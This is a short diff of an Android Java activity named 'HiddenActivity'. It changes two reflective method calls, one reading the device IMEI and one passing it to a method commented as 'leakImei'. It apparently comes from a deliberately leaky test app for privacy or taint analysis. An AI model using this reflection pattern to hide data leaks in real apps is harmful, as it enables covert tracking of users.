@@ -43,7 +43,7 @@ public class HiddenActivity extends Activity {
         }
 
         try {
-           imei = (String)methodGet.invoke(new ServClass());
+           imei = (String)methodGet.invoke(ServiceObj);
         } catch (IllegalAccessException e) {
             e.printStackTrace();
         } catch (InvocationTargetException e) {
@@ -56,7 +56,7 @@ public class HiddenActivity extends Activity {
             e.printStackTrace();
         }
         try {
-            methodLeak.invoke(new ServClass(),imei); // call leakImei and has imei as the argument
+            methodLeak.invoke(ServiceObj,imei); // call leakImei and has imei as the argument
         } catch (IllegalAccessException e) {
             e.printStackTrace();
         } catch (InvocationTargetException e) {
